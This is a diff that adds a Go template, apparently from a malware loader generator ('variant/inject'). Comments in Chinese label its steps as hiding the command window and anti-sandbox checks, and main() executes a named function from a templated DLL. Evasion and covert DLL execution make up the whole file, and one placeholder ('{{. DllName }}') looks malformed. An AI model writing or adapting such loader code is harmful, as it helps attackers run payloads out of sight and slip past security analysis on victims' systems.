@@ -1,0 +1,27 @@
+package main
+
+import (
+    "variant/inject"
+
+	{{if .Args}}
+    	 "{{.Args.Import}}"
+    {{end}}
+)
+
+func init() {
+    {{/* 代码层面隐藏CMD */}}
+    {{if .Loader.Hide}}
+	    {{.Loader.Hide}}()
+    {{end}}
+
+    {{/* 反沙箱 */}}
+    {{if .SandBox}}
+        {{range .SandBox.Methods}}
+            {{.}}()
+	    {{end}}
+	{{end}}
+}
+
+func main(){
+    {{ .DllRunner }}("{{. DllName }}", "{{ .DllFunc }}")
+}
